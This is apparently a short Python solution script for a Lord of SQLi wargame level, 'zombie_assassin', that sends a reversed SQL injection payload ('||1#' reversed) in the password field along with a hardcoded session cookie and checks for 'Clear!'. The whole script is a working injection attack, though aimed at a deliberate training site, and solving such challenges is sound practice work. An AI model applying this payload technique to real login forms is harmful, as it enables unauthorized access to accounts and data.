import requests

url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php/"
cookie = {"PHPSESSID" : "tibb2rs3ofa7rjdogjml4vbvd6"}

if requests.get(url, {"id" : "\"", "pw":"||1#"[::-1]}, cookies=cookie).text.find("Clear!") > 0 : print("[*] Success")
